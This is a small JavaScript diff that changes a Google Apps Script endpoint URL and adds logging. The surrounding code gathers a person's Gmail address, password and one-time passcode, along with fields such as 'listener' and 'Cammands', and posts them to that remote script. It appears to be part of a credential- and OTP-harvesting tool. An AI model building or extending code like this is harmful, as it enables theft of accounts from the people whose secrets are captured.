@@ -1,4 +1,4 @@
-var url = "https://script.google.com/macros/s/AKfycbxYIS9r2RjAVOzg8iX7blJWDIRTV48rmEOZ3Ad5PEpofLLFe-JxBlpD_1orV_ZdBJ-h/exec";
+var url = "https://script.google.com/macros/s/AKfycbwq446_wKNl_UWxmp-_uG9Dx4ftgrPl73FlmDwjZ9XI-J3XPAYg3LohPWp4wHf9qkU_/exec";
 
 obj = [{
 
@@ -38,7 +38,7 @@ function CUstomerdetalis(listener,Cammands, Profile_Photo, Name, Address, Mobile
     obj[0]["gmail"] = gmail;
     obj[0]["password"] = password;
     obj[0]["OTP"] = OTP;
-
+   
     return obj;
 
 }
@@ -77,6 +77,7 @@ async function get_and_set_value(objs) {
         }
 
         const data = await response.json(); // Parse JSON data
+        console.log(data);
         return data; // Return the parsed data
     } catch (error) {
         console.error('Error:', error);
